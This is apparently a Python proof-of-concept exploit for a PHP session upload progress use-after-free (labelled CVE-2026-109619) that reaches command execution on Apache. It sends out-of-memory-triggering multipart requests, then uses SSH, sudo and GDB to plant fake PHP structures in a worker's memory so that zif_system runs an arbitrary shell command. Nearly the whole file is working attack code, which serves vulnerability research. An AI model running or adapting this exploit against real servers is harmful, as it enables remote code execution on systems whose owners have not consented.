#!/usr/bin/env python3
"""
CVE-2026-109619 — PHP Session Upload Progress UAF → RCE
GDB-assisted proof-of-concept

2-request chain: producer OOM → stale IS_REFERENCE → consumer triggers
zval_ptr_dtor via session cleanup → pDestructor dispatch → zif_system

Supports multi-worker Apache prefork: scans all workers to find the
armed one, then sprays consumers until one hits it.
"""
import argparse
import os
import re
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time

# ─── Default configuration ───────────────────────────────────────────
DEFAULT_HOST    = "127.0.0.1"
DEFAULT_PORT    = 80
DEFAULT_CMD     = "id>/var/www/html/pwn.txt"
DEFAULT_OUTFILE = "/var/www/html/pwn.txt"
DEFAULT_SSH_USER = "user"
DEFAULT_SSH_PASS = "pass"
DEFAULT_SESSION_ID = "attacksid00001"
DEFAULT_MEMORY_LIMIT_MB = 8

# PHP internals constants (PHP 8.4)
OFFSET_HTTP_SESSION_VARS = 0x168
IS_REFERENCE   = 0x0a
IS_ARRAY_EX    = 0x307
IS_NULL        = 1
IS_STRING      = 6
IS_STRING_EX   = 0x106

# Payload layout offsets (relative to stale reference address)
HT_OFFSET  = 0x40
ED_OFFSET  = 0x80
STR_OFFSET = 0x100


# ─── SSH / SCP helpers ───────────────────────────────────────────────
def ssh_cmd(host, user, password, cmd, timeout=30):
    r = subprocess.run(
        ["sshpass", "-p", password, "ssh",
         "-o", "StrictHostKeyChecking=no",
         "-o", "PubkeyAuthentication=no",
         f"{user}@{host}", cmd],
        capture_output=True, text=True, timeout=timeout
    )
    return r.stdout + r.stderr


def scp_to(host, user, password, local_path, remote_path):
    subprocess.run(
        ["sshpass", "-p", password, "scp",
         "-o", "StrictHostKeyChecking=no",
         "-o", "PubkeyAuthentication=no",
         local_path, f"{user}@{host}:{remote_path}"],
        capture_output=True, text=True, timeout=15
    )


# ─── HTTP helpers ────────────────────────────────────────────────────
def build_multipart(parts, boundary):
    out = bytearray()
    for p in parts:
        name = p["name"].encode() if isinstance(p["name"], str) else p["name"]
        data = p["data"] if isinstance(p["data"], bytes) else p["data"].encode()
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename"):
            fn = p["filename"].encode() if isinstance(p["filename"], str) else p["filename"]
            out += b'; filename="' + fn + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + data + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def http_post(host, port, body, boundary, timeout=60, connection="close"):
    hdr = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: {connection}\r\n\r\n"
    ).encode()
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    data = bytearray()

    def reader():
        try:
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                data.extend(chunk)
        except OSError:
            pass

    t = threading.Thread(target=reader, daemon=True)
    t.start()
    try:
        s.sendall(hdr)
        for off in range(0, len(body), 262144):
            s.sendall(body[off:off + 262144])
    except OSError:
        pass
    t.join(timeout=timeout + 1)
    s.close()
    return bytes(data)


def spray_consumers(host, port, sid, count, boundary=b"CONSUMER"):
    """Send `count` consumer requests in parallel threads."""
    consumer_parts = [
        {"name": "PHPSESSID",                  "data": sid.encode()},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(3):
        consumer_parts.append({"name": f"p{i:02d}", "data": b"X" * 8})
    body = build_multipart(consumer_parts, boundary)

    results = []
    def send_one(idx):
        bnd = f"CONSUMER{idx:03d}".encode()
        b = build_multipart(consumer_parts, bnd)
        try:
            resp = http_post(host, port, b, bnd, timeout=15)
            results.append((idx, len(resp)))
        except Exception:
            results.append((idx, -1))

    threads = []
    for i in range(count):
        t = threading.Thread(target=send_one, args=(i,))
        threads.append(t)

    # Stagger slightly to avoid thundering herd
    for t in threads:
        t.start()
        time.sleep(0.05)

    for t in threads:
        t.join(timeout=20)

    return results


# ─── Payload construction ────────────────────────────────────────────
def build_payload_gdb_commands(ref_addr, zif_system, cmd_bytes):
    HT   = ref_addr + HT_OFFSET
    ED   = ref_addr + ED_OFFSET
    STR  = ref_addr + STR_OFFSET
    cmds = []

    # Fake HashTable (56B)
    cmds.append(f"set {{unsigned int}}{HT} = 1")
    cmds.append(f"set {{unsigned int}}({HT}+4) = 7")
    cmds.append(f"set {{unsigned int}}({HT}+8) = 0x10")
    cmds.append(f"set {{unsigned int}}({HT}+12) = 0xFFFFFFF8")
    cmds.append(f"set {{unsigned long}}({HT}+16) = {ED}")
    cmds.append(f"set {{unsigned int}}({HT}+24) = 1")
    cmds.append(f"set {{unsigned int}}({HT}+28) = 1")
    cmds.append(f"set {{unsigned int}}({HT}+32) = 8")
    cmds.append(f"set {{unsigned int}}({HT}+36) = 0")
    cmds.append(f"set {{unsigned long}}({HT}+40) = 0")
    cmds.append(f"set {{unsigned long}}({HT}+48) = {zif_system}")

    # Fake Bucket[0] / execute_data (96B)
    cmds.append(f"set {{unsigned long}}{ED} = 0")
    cmds.append(f"set {{unsigned int}}({ED}+8) = {IS_NULL}")
    cmds.append(f"set {{unsigned int}}({ED}+12) = 0")
    cmds.append(f"set {{unsigned long}}({ED}+16) = {zif_system}")
    cmds.append(f"set {{unsigned long}}({ED}+24) = 0")
    cmds.append(f"set {{unsigned long}}({ED}+32) = 0")
    cmds.append(f"set {{unsigned int}}({ED}+40) = 0")
    cmds.append(f"set {{unsigned int}}({ED}+44) = 1")
    cmds.append(f"set {{unsigned long}}({ED}+48) = 0")
    cmds.append(f"set {{unsigned long}}({ED}+56) = 0")
    cmds.append(f"set {{unsigned long}}({ED}+64) = 0")
    cmds.append(f"set {{unsigned long}}({ED}+72) = 0")
    cmds.append(f"set {{unsigned long}}({ED}+80) = {STR}")
    cmds.append(f"set {{unsigned int}}({ED}+88) = {IS_STRING}")
    cmds.append(f"set {{unsigned int}}({ED}+92) = 0")

    # Fake zend_string
    cmds.append(f"set {{unsigned int}}{STR} = 1")
    cmds.append(f"set {{unsigned int}}({STR}+4) = {IS_STRING_EX}")
    cmds.append(f"set {{unsigned long}}({STR}+8) = 0")
    cmds.append(f"set {{unsigned long}}({STR}+16) = {len(cmd_bytes)}")
    for i in range(0, len(cmd_bytes), 8):
        chunk = cmd_bytes[i:i + 8].ljust(8, b'\x00')
        val = struct.unpack('<Q', chunk)[0]
        cmds.append(f"set {{unsigned long}}({STR}+24+{i}) = {val}")
    cmds.append(f"set {{char}}({STR}+24+{len(cmd_bytes)}) = 0")

    # Patch stale zend_reference
    cmds.append(f"set {{unsigned int}}{ref_addr} = 1")
    cmds.append(f"set {{unsigned int}}({ref_addr}+4) = {IS_REFERENCE}")
    cmds.append(f"set {{unsigned long}}({ref_addr}+8) = {HT}")
    cmds.append(f"set {{unsigned int}}({ref_addr}+16) = {IS_ARRAY_EX}")
    cmds.append(f"set {{unsigned int}}({ref_addr}+20) = 0")
    cmds.append(f"set {{unsigned long}}({ref_addr}+24) = 0")

    return cmds


# ─── Worker scanning ────────────────────────────────────────────────
def get_worker_pids(host, user, password):
    out = ssh_cmd(host, user, password,
        "pgrep -P $(pgrep -o apache2)")
    pids = [p.strip() for p in out.strip().split("\n") if p.strip().isdigit()]
    return pids


def find_armed_worker(host, user, password, pids):
    """
    Scan all workers to find the one with IS_REFERENCE in PS(http_session_vars).
    Returns (pid, ps_globals, zif_system, ref_addr) or None.
    """
    # First get ps_globals + zif_system from any worker (same for all, shared libphp)
    out = ssh_cmd(host, user, password,
        f"echo {password} | sudo -S gdb -batch "
        f"-ex 'attach {pids[0]}' "
        f"-ex 'printf \"PS_GLOBALS=%p\\n\", &ps_globals' "
        f"-ex 'info address zif_system' "
        f"-ex 'detach' -ex 'quit' 2>&1"
    )
    m_ps = re.search(r'PS_GLOBALS=(0x[0-9a-f]+)', out)
    m_zif = (re.search(r'(0x[0-9a-f]+)\s+<zif_system>', out) or
             re.search(r'zif_system.*?(0x[0-9a-f]+)', out))
    if not m_ps or not m_zif:
        print(f"[!] Cannot read symbols: {out[:300]}")
        return None

    ps_globals = int(m_ps.group(1), 16)
    zif_system = int(m_zif.group(1), 16)
    hsv_addr = ps_globals + OFFSET_HTTP_SESSION_VARS

    # Build a batch GDB script that checks all workers
    check_cmds = ["set pagination off", "set confirm off"]
    for pid in pids:
        check_cmds.append(f"attach {pid}")
        check_cmds.append(
            f'printf "PID={pid} TYPE=0x%x VAL=0x%lx\\n", '
            f'((unsigned int *){hsv_addr})[2], '
            f'*(unsigned long *){hsv_addr}')
        check_cmds.append("detach")
    check_cmds.append("quit")

    script = "\n".join(check_cmds) + "\n"
    with tempfile.NamedTemporaryFile(mode='w', suffix='.gdb', delete=False) as f:
        f.write(script)
        local_path = f.name
    scp_to(host, user, password, local_path, "/tmp/scan_workers.gdb")
    os.unlink(local_path)

    out2 = ssh_cmd(host, user, password,
        f"echo {password} | sudo -S gdb -batch -x /tmp/scan_workers.gdb 2>&1",
        timeout=60)

    armed = None
    for line in out2.split("\n"):
        m = re.search(r'PID=(\d+)\s+TYPE=(0x[0-9a-f]+)\s+VAL=(0x[0-9a-f]+)', line)
        if m:
            pid = m.group(1)
            typ = int(m.group(2), 16)
            val = int(m.group(3), 16)
            is_ref = (typ & 0xFF) == IS_REFERENCE
            print(f"      PID {pid}: type={hex(typ)} val={hex(val)}"
                  f"{' ← ARMED' if is_ref else ''}")
            if is_ref and armed is None:
                armed = (pid, ps_globals, zif_system, val)

    return armed


# ─── GDB script generation ──────────────────────────────────────────
def generate_gdb_script(worker_pid, ref_addr, zif_system, cmd_bytes):
    HT  = ref_addr + HT_OFFSET
    ED  = ref_addr + ED_OFFSET
    STR = ref_addr + STR_OFFSET

    payload_cmds = build_payload_gdb_commands(ref_addr, zif_system, cmd_bytes)

    lines = [
        "set pagination off",
        "set confirm off",
        f"attach {worker_pid}",
        "",
        "break php_session_track_init",
        "commands 1",
        '  printf "\\n>>> track_init HIT — writing payload <<<\\n"',
        f'  printf "BEFORE: ref rc=%d type=0x%x val=0x%lx inner=0x%x\\n", '
        f'*(unsigned int *){ref_addr}, ((unsigned int *){ref_addr})[1], '
        f'*(unsigned long *)({ref_addr}+8), *(unsigned int *)({ref_addr}+16)',
    ]
    for cmd in payload_cmds:
        lines.append(f"  {cmd}")
    lines += [
        f'  printf "AFTER: ref rc=%d type=0x%x val=0x%lx inner=0x%x\\n", '
        f'*(unsigned int *){ref_addr}, ((unsigned int *){ref_addr})[1], '
        f'*(unsigned long *)({ref_addr}+8), *(unsigned int *)({ref_addr}+16)',
        f'  printf "HT.pDestructor=0x%lx arData=0x%lx nNumUsed=%d\\n", '
        f'*(unsigned long *)({HT}+48), *(unsigned long *)({HT}+16), '
        f'*(unsigned int *)({HT}+24)',
        f'  printf "STR.len=%ld val=%s\\n", '
        f'*(unsigned long *)({STR}+16), (char *)({STR}+24)',
        "  continue",
        "end",
        "",
        f"break *{zif_system}",
        "commands 2",
        '  printf "\\n>>> zif_system CALLED <<<\\n"',
        '  printf "rdi=%p rsi=%p\\n", $rdi, $rsi',
        "  continue",
        "end",
        "",
        "continue",
    ]
    return "\n".join(lines) + "\n"


# ─── Main exploit flow ───────────────────────────────────────────────
def run_exploit(args):
    host     = args.host
    port     = args.port
    ssh_user = args.ssh_user
    ssh_pass = args.ssh_pass
    cmd_str  = args.cmd
    cmd_bytes = cmd_str.encode()
    outfile  = args.outfile
    sid      = args.session_id
    spray_n  = args.spray
    mem_mb   = args.memory_limit

    # OOM body must exceed memory_limit; use ~1.5x to ensure OOM during multipart parsing
    oom_size = int(mem_mb * 1.5 * 1024 * 1024)

    def _ssh(cmd, timeout=30):
        return ssh_cmd(host, ssh_user, ssh_pass, cmd, timeout)

    def _scp(local, remote):
        scp_to(host, ssh_user, ssh_pass, local, remote)

    print("=" * 60)
    print(f"CVE-2026-109619 — PHP Session Upload Progress UAF → RCE")
    print(f"Target  : {host}:{port}")
    print(f"Workers : {args.workers} (spray {spray_n})")
    print(f"OOM     : {oom_size // (1024*1024)}MB body (memory_limit={mem_mb}M)")
    print(f"Command : {cmd_str}")
    print("=" * 60)

    # ── Stage 1: Restart Apache ──────────────────────────────────────
    print("\n[1/7] Restarting Apache…")
    _ssh(f"echo {ssh_pass} | sudo -S systemctl restart apache2 2>/dev/null")
    time.sleep(2)
    _ssh(f"echo {ssh_pass} | sudo -S rm -f {outfile} 2>/dev/null")

    pids = get_worker_pids(host, ssh_user, ssh_pass)
    print(f"      {len(pids)} workers: {' '.join(pids)}")

    # ── Stage 2: Producer OOM ────────────────────────────────────────
    print("\n[2/7] Sending producer (OOM trigger)…")
    parts = [
        {"name": "PHPSESSID",                  "data": sid.encode()},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(6):
        parts.append({"name": f"pad{i:04d}", "data": b"V" * 7})
    parts.append({"name": "f", "filename": "a.txt", "data": b"A" * 64})
    parts.append({"name": "big", "data": b"B" * oom_size})

    producer_timeout = max(60, oom_size // (1024 * 1024) * 3)
    resp = http_post(host, port, build_multipart(parts, b"PRODUCER"), b"PRODUCER", timeout=producer_timeout)
    print(f"      Response: {len(resp)} bytes")
    time.sleep(1)

    # Refresh PID list (worker may have respawned)
    pids = get_worker_pids(host, ssh_user, ssh_pass)
    print(f"      Workers after OOM: {len(pids)} — {' '.join(pids)}")

    # ── Stage 3: Scan workers for armed one ──────────────────────────
    print("\n[3/7] Scanning workers for stale IS_REFERENCE…")
    armed = find_armed_worker(host, ssh_user, ssh_pass, pids)

    if armed is None:
        print("[!] No armed worker found. Producer may not have created stale state.")
        sys.exit(1)

    armed_pid, ps_globals, zif_system, ref_addr = armed
    print(f"\n      Armed worker: PID {armed_pid}")
    print(f"      ps_globals  = {hex(ps_globals)}")
    print(f"      zif_system  = {hex(zif_system)}")
    print(f"      stale ref   = {hex(ref_addr)}")

    # ── Stage 4: Upload GDB breakpoint script ────────────────────────
    print("\n[4/7] Uploading GDB script…")
    gdb_script = generate_gdb_script(armed_pid, ref_addr, zif_system, cmd_bytes)

    with tempfile.NamedTemporaryFile(mode='w', suffix='.gdb', delete=False) as f:
        f.write(gdb_script)
        local_gdb = f.name
    _scp(local_gdb, "/tmp/exploit.gdb")
    os.unlink(local_gdb)

    # ── Stage 5: Start GDB on armed worker ───────────────────────────
    print(f"\n[5/7] Starting GDB on PID {armed_pid} (breakpoint on track_init)…")
    gdb_proc = subprocess.Popen(
        ["sshpass", "-p", ssh_pass, "ssh",
         "-o", "StrictHostKeyChecking=no",
         "-o", "PubkeyAuthentication=no",
         f"{ssh_user}@{host}",
         f"echo {ssh_pass} | sudo -S timeout 60 gdb -batch -x /tmp/exploit.gdb 2>&1"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    time.sleep(3)

    # ── Stage 6: Spray consumers ─────────────────────────────────────
    print(f"\n[6/7] Spraying {spray_n} consumers…")
    spray_results = spray_consumers(host, port, sid, spray_n)
    empty = sum(1 for _, sz in spray_results if sz == 0)
    ok    = sum(1 for _, sz in spray_results if sz > 0)
    fail  = sum(1 for _, sz in spray_results if sz < 0)
    print(f"      Results: {ok} responded, {empty} empty (crash), {fail} failed")

    # Collect GDB output
    print("\n      Collecting GDB output…")
    try:
        stdout, stderr = gdb_proc.communicate(timeout=30)
    except subprocess.TimeoutExpired:
        gdb_proc.kill()
        stdout, stderr = gdb_proc.communicate()

    gdb_out = stdout.decode("latin1", errors="replace")
    keywords = [">>>", "BEFORE:", "AFTER:", "HT.", "STR.",
                "zif_system", "num_args", "rdi=", "Signal"]
    print("      GDB key lines:")
    for line in gdb_out.split("\n"):
        line = line.strip()
        if any(k in line for k in keywords):
            print(f"        {line}")

    # ── Stage 7: Check result ────────────────────────────────────────
    print(f"\n[7/7] Checking {outfile}…")
    time.sleep(0.5)
    result = _ssh(f"cat {outfile} 2>/dev/null || echo NO_FILE").strip()

    if "uid=" in result or (outfile != DEFAULT_OUTFILE and result != "NO_FILE"):
        print(f"\n{'='*60}")
        print(f"  [+] RCE SUCCESS: {result}")
        print(f"{'='*60}")
        return True
    else:
        print("  [-] RCE output not found")
        log = _ssh("tail -5 /var/log/apache2/error.log 2>/dev/null")
        print(f"      Apache log: {log.strip()[:200]}")
        return False


def parse_args():
    p = argparse.ArgumentParser(
        description="CVE-2026-109619 PHP Session Upload Progress UAF → RCE (GDB-assisted)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
examples:
  %(prog)s -u 10.0.0.1 -w 20 -m 30
  %(prog)s -u 10.0.0.1 -w 150 -m 64 --cmd 'whoami > /var/www/html/out.txt'
  %(prog)s -u 10.0.0.1 -w 1 -m 8 --spray 5""")

    p.add_argument("-u", "--url",  default=DEFAULT_HOST, metavar="HOST",
                   help="Target IP or hostname (default: %(default)s)")
    p.add_argument("-w", "--workers", type=int, default=1, metavar="N",
                   help="Number of Apache workers on target (default: 1)")
    p.add_argument("-m", "--memory-limit", type=int, default=DEFAULT_MEMORY_LIMIT_MB,
                   metavar="MB",
                   help="Target's memory_limit in MB (default: %(default)s)")

    p.add_argument("--port",       type=int, default=DEFAULT_PORT)
    p.add_argument("--cmd",        default=DEFAULT_CMD,
                   help="Shell command to execute (default: %(default)s)")
    p.add_argument("--outfile",    default=DEFAULT_OUTFILE,
                   help="Output file to verify RCE (default: %(default)s)")
    p.add_argument("--ssh-user",   default=DEFAULT_SSH_USER)
    p.add_argument("--ssh-pass",   default=DEFAULT_SSH_PASS,
                   help="SSH password, also used for sudo")
    p.add_argument("--session-id", default=DEFAULT_SESSION_ID)
    p.add_argument("--spray",      type=int, default=0, metavar="N",
                   help="Consumer spray count (default: workers × 3, min 10)")

    args = p.parse_args()
    # -u doubles as --host for backward compat
    args.host = args.url
    # auto-calculate spray from workers if not specified
    if args.spray <= 0:
        args.spray = max(10, args.workers * 3)
    return args


if __name__ == "__main__":
    run_exploit(parse_args())
